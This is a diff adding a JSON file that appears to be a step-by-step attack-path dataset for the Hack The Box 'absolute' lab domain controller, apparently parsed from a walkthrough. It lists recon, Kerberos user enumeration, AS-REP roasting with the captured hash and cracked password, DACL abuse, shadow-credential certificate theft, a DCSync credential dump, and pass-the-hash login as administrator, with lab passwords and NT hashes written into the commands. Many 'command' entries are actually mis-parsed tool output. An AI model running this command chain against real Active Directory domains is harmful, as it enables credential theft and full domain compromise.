@@ -1,0 +1,550 @@
+{
+  "target_ip": "10.10.11.181",
+  "os": "windows",
+  "steps": [
+    {
+      "phase": "recon",
+      "section": "nmap",
+      "command": "nmap -p- --min-rate 10000 10.10.11.181",
+      "action": "nmap_full",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "nmap",
+      "command": "nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 10.10.11.181",
+      "action": "nmap_scripts",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "SMB - TCP 445",
+      "command": "crackmapexec smb 10.10.11.181 --shares",
+      "action": "smb_share_enum",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "SMB - TCP 445",
+      "command": "crackmapexec smb 10.10.11.181 --shares -u 0xdf -p ''",
+      "action": "smb_share_enum",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "LDAP - TCP 389+",
+      "command": "ldapsearch -H ldap://dc.absolute.htb -x -s base namingcontexts",
+      "action": "ldapsearch",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "LDAP - TCP 389+",
+      "command": "extended LDIF",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "LDAP - TCP 389+",
+      "command": "LDAPv3",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "LDAP - TCP 389+",
+      "command": "base <> (default) with scope baseObject",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "LDAP - TCP 389+",
+      "command": "filter: (objectclass=*)",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "LDAP - TCP 389+",
+      "command": "requesting: namingcontexts",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "LDAP - TCP 389+",
+      "command": "search result",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "LDAP - TCP 389+",
+      "command": "numResponses: 2",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "LDAP - TCP 389+",
+      "command": "numEntries: 1",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "LDAP - TCP 389+",
+      "command": "ldapsearch -H ldap://dc.absolute.htb -x -b \"DC=absolute,DC=htb\"",
+      "action": "ldapsearch",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "LDAP - TCP 389+",
+      "command": "extended LDIF",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "LDAP - TCP 389+",
+      "command": "LDAPv3",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "LDAP - TCP 389+",
+      "command": "base <DC=absolute,DC=htb> with scope subtree",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "LDAP - TCP 389+",
+      "command": "filter: (objectclass=*)",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "LDAP - TCP 389+",
+      "command": "requesting: ALL",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "LDAP - TCP 389+",
+      "command": "search result",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "LDAP - TCP 389+",
+      "command": "numResponses: 1",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "DNS - TCP/UDP 53",
+      "command": "dig +noall +answer @10.10.11.181 axfr absolute.htb",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "DNS - TCP/UDP 53",
+      "command": "dig +noall +answer @10.10.11.181 absolute.htb",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "DNS - TCP/UDP 53",
+      "command": "dig +noall +answer @10.10.11.181 dc.absolute.htb",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "DNS - TCP/UDP 53",
+      "command": "dnsenum --dnsserver 10.10.11.181 -f /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt absolute.htb",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "foothold",
+      "section": "Directory Brute Force",
+      "command": "feroxbuster -u http://absolute.htb",
+      "action": "feroxbuster",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Image Metadata",
+      "command": "exiftool hero_1.jpg",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Generate Users List",
+      "command": "for i in $(seq 1 6); do exiftool hero_${i}.jpg | grep Author | awk '{print $3 \" \" $4}'; done | tee users",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Generate Users List",
+      "command": "/opt/username-anarchy/username-anarchy -i users | tee usernames",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Find Valid Usernames",
+      "command": "kerbrute userenum --dc dc.absolute.htb -d absolute.htb usernames",
+      "action": "kerbrute_userenum",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Capture Hash",
+      "command": "GetNPUsers.py -dc-ip dc.absolute.htb -usersfile valid_users absolute.htb/",
+      "action": "asreproast",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Capture Hash",
+      "command": "krb5asrep$23$d.klay@ABSOLUTE.HTB:ad46f063b562f401556b5776be338a99$42087e6c57351f790f2847e472feb8b0a4d2e9d340ed28c8841483140e4eb039c9a29459d0bb15c470202904148c9ba298e36836317ca13753ad62e28a8b400687fa64c5da09d4da3191e2aa7346fb9472d088cf9ba89993aaead6b8fd514e3a64b317f50a8844137c74d5daa51dfcfa0ad5f74c81e71228085565aa4597c3ae1385f5626d90b1215730b037b78cac4d105d9b3ca4c50279ad946e47ef8969d17d6d81aaf52b9d4248d771d6f33b893716468858ee8000e967062c658f692204d45518ef80bdd9094dcc44513a46a1c456dcebb32b072955ab8eb6db1b0482adae2ecd7847f420c3d4f35020",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Crack Password",
+      "command": "hashcat d.klay.hash /usr/share/wordlists/rockyou.txt",
+      "action": "hashcat",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Crack Password",
+      "command": "krb5asrep$23$d.klay@ABSOLUTE.HTB:ad46f063b562f401556b5776be338a99$42087e6c57351f790f2847e472feb8b0a4d2e9d340ed28c8841483140e4eb039c9a29459d0bb15c470202904148c9ba298e36836317ca13753ad62e28a8b400687fa64c5da09d4da3191e2aa7346fb9472d088cf9ba89993aaead6b8fd514e3a64b317f50a8844137c74d5daa51dfcfa0ad5f74c81e71228085565aa4597c3ae1385f5626d90b1215730b037b78cac4d105d9b3ca4c50279ad946e47ef8969d17d6d81aaf52b9d4248d771d6f33b893716468858ee8000e967062c658f692204d45518ef80bdd9094dcc44513a46a1c456dcebb32b072955ab8eb6db1b0482adae2ecd7847f420c3d4f35020:Darkmoonsky248girl",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Validate with CME",
+      "command": "crackmapexec smb 10.10.11.181 -u d.klay -p 'Darkmoonsky248girl'",
+      "action": "crackmapexec_spray",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Validate with CME",
+      "command": "crackmapexec smb 10.10.11.181 -u d.klay -p 'Darkmoonsky248girl' -k",
+      "action": "crackmapexec_spray",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "kinit",
+      "command": "kinit d.klay",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "kinit",
+      "command": "klist",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Bloodhound",
+      "command": "bloodhound-python -u d.klay -p 'Darkmoonsky248girl' -k -d absolute.htb -dc dc.absolute.htb -c ALL --zip",
+      "action": "bloodhound",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "SMB",
+      "command": "crackmapexec smb dc.absolute.htb -k -u d.klay -p 'Darkmoonsky248girl' --shares",
+      "action": "smb_share_enum",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "SMB",
+      "command": "smbclient.py 'absolute.htb/d.klay:Darkmoonsky248girl@dc.absolute.htb' -k -no-pass",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "SMB",
+      "command": "shares",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "SMB",
+      "command": "use sysvol",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "CrackMapExec",
+      "command": "crackmapexec ldap 10.10.11.181 -u d.klay -p 'Darkmoonsky248girl' -k --users",
+      "action": "ldap_enum",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "CrackMapExec",
+      "command": "crackmapexec smb 10.10.11.181 -u svc_smb -p 'AbsoluteSMBService123!' -k",
+      "action": "crackmapexec_spray",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "ldapsearch Errors",
+      "command": "ldapsearch -H ldap://dc.absolute.htb -x -D d.klay@absolute.htb -w Darkmoonsky248girl -s base",
+      "action": "ldapsearch",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "ldapsearch Errors",
+      "command": "ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b \"dc=absolute,dc=htb\"",
+      "action": "ldapsearch",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Get Data",
+      "command": "ldapsearch -H ldap://dc.absolute.htb -b \"dc=absolute,dc=htb\" | less",
+      "action": "ldapsearch",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Get Data",
+      "command": "svc_smb, Users, absolute.htb",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "SMB",
+      "command": "crackmapexec smb dc.absolute.htb -k -u svc_smb -p 'AbsoluteSMBService123!' --shares",
+      "action": "smb_share_enum",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "SMB",
+      "command": "smbclient.py 'absolute.htb/svc_smb:AbsoluteSMBService123!@dc.absolute.htb' -k -no-pass",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "SMB",
+      "command": "use shared",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "SMB",
+      "command": "get compiler.sh",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "SMB",
+      "command": "get test.exe",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "SMB",
+      "command": "file test.exe",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "Validate Creds",
+      "command": "crackmapexec smb 10.10.11.181 -u mlovegod -p 'AbsoluteLDAP2022!' -k",
+      "action": "crackmapexec_spray",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "recon",
+      "section": "Validate Creds",
+      "command": "crackmapexec smb 10.10.11.181 -u m.lovegod -p 'AbsoluteLDAP2022!' -k",
+      "action": "crackmapexec_spray",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Linux",
+      "command": "git clone https://github.com/ShutdownRepo/impacket.git impacket-dacl",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Linux",
+      "command": "cd impacket-dacl",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Linux",
+      "command": "pip install .",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Linux",
+      "command": "dacledit.py -k 'absolute.htb/m.lovegod:AbsoluteLDAP2022!' -dc-ip dc.absolute.htb -principal m.lovegod -target \"Network Audit\" -action write -rights WriteMembers",
+      "action": "dacledit",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Linux",
+      "command": "net rpc group members \"Network Audit\" -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Linux",
+      "command": "net rpc group addmem \"Network Audit\" m.lovegod -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Linux",
+      "command": "net rpc group members \"Network Audit\" -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Linux",
+      "command": "rm /tmp/krb5cc_1000",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Linux",
+      "command": "kinit m.lovegod",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Linux",
+      "command": "net rpc group members \"Network Audit\" -U 'm.lovegod' -k -S dc.absolute.htb",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Linux",
+      "command": "net rpc group addmem \"Network Audit\" m.lovegod -U 'm.lovegod' -k -S dc.absolute.htb",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Linux",
+      "command": "net rpc group members \"Network Audit\" -U 'm.lovegod' -k -S dc.absolute.htb",
+      "action": "unknown",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Shadow Credential",
+      "command": "KRB5CCNAME=/tmp/krb5cc_1000 certipy find -username m.lovegod@absolute.htb -k -target dc.absolute.htb",
+      "action": "certipy",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Shadow Credential",
+      "command": "KRB5CCNAME=/tmp/krb5cc_1000 certipy shadow auto -username m.lovegod@absolute.htb -account winrm_user -k -target dc.absolute.htb",
+      "action": "certipy",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "Shell",
+      "command": "KRB5CCNAME=./winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb",
+      "action": "evil_winrm",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "foothold",
+      "section": "KrbRelay Background",
+      "command": "crackmapexec ldap 10.10.11.181 -u m.lovegod -p 'AbsoluteLDAP2022!' -M ldap-checker -k",
+      "action": "ldap_enum",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "user",
+      "section": "DC Sync",
+      "command": "crackmapexec smb -dc-ip dc.absolute.htb -u 'DC$' -H A7864AB463177ACB9AEC553F18F42577 --ntds",
+      "action": "crackmapexec_spray",
+      "target_ip": "10.10.11.181"
+    },
+    {
+      "phase": "foothold",
+      "section": "Evil-WinRM",
+      "command": "evil-winrm -i 10.10.11.181 -u administrator -H 1f4a6093623653f6488d5aa24c75f2ea",
+      "action": "evil_winrm",
+      "target_ip": "10.10.11.181"
+    }
+  ],
+  "total_commands": 75,
+  "actions_used": [
+    "unknown",
+    "bloodhound",
+    "ldapsearch",
+    "kerbrute_userenum",
+    "certipy",
+    "evil_winrm",
+    "dacledit",
+    "smb_share_enum",
+    "asreproast",
+    "crackmapexec_spray",
+    "ldap_enum",
+    "hashcat",
+    "nmap_scripts",
+    "feroxbuster",
+    "nmap_full"
+  ],
+  "box_name": "absolute"
+}
